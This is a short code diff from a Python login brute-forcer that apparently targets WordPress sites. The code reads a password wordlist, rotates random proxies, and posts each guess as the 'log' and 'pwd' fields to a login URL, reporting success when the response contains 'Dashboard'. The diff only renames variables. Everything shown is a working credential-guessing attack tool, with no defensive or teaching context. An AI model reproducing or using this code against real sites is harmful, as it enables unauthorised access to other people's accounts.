@@ -60,7 +60,7 @@ class a:
 
 	def brute(self):
 		self.nani = open(self.password, 'r').readlines()
-		self.mani = open(self.password, 'r').readlines()
+		self.reks1 = open(self.password, 'r').readlines()
 		self.testing = requests.get(self.url).text
 		self.random = random.choice(self.proxi)
 		ha = {'http':self.random}
@@ -78,12 +78,12 @@ class a:
 						print("\033[GAGAL] [31m{}" .format(yeah))
 			else:
 				print("  [\033[36m*\033[32m] NO ANSWER [\033[36m*\033[32m]")
-				for z in self.mani:
+				for z in self.reks1:
 					yeahmen = z.strip()
 					self.datadata = {'log':self.username,'pwd':yeahmen}
 					jebol = requests.post(self.url, data=self.datadata, headers=self.headers)
-					kento = (jebol).text
-					if 'Dashboard' in kento:
+					reks2 = (jebol).text
+					if 'Dashboard' in reks2:
 						print("\033[32m[SUKSES] \033[32m{} ".format(yeahmen))
 					else:
 						print("\033[31m[GAGAL] {}" .format(yeahmen) )
